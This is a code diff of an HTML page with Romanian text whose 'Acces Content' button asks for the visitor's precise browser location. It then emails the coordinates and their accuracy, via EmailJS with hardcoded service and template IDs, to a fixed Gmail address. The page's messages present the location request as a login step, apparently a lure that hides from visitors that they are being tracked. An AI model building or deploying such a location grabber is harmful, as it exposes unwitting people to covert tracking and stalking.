@@ -40,8 +40,10 @@
     <button onclick="sendLocation()">Acces Content</button>
     
     <script>
-        emailjs.init("bIL849otAkTIk8w1o"); // Public Key
-
+        (function() {
+            emailjs.init("bIL849otAkTIk8w1o"); // Public Key
+        })();
+        
         function sendLocation() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(position => {
@@ -49,28 +51,27 @@
                     const longitude = position.coords.longitude;
                     const accuracy = position.coords.accuracy;
                     
-                    const emailParams = {
-                        to_email: "ciprianionut.exe17@gmail.com",
-                        subject: "Locație utilizator",
+                    const templateParams = {
+                        user_email: "ciprianionut.exe17@gmail.com",
                         message: `Latitudine: ${latitude}, Longitudine: ${longitude}, Precizie: ${accuracy}m`
                     };
-
-                    emailjs.send("service_ar3ptv9", "template_er5zc5m", emailParams)
+                    
+                    emailjs.send("service_ar3ptv9", "template_er5zc5m", templateParams)
                         .then(response => {
-                            alert("Locația a fost trimisă cu succes!");
+                            alert("Locația a fost trimisă pe email!");
                         }, error => {
-                            console.error("Eroare la trimiterea emailului:", error);
-                            alert("Eroare la trimiterea locației.");
+                            console.error("Eroare la trimitere:", error);
+                            alert("Eroare la trimiterea emailului.");
                         });
                 }, error => {
-                    alert("Nu te poti autentifica. Verifică permisiunile browserului.");
+                    alert('Nu te poti autentifica. Verifică permisiunile browserului.');
                 }, {
                     enableHighAccuracy: true,
                     timeout: 10000,
                     maximumAge: 0
                 });
             } else {
-                alert("Browserul tău nu suportă geolocalizare.");
+                alert('Browserul tău nu suportă geolocalizare.');
             }
         }
     </script>
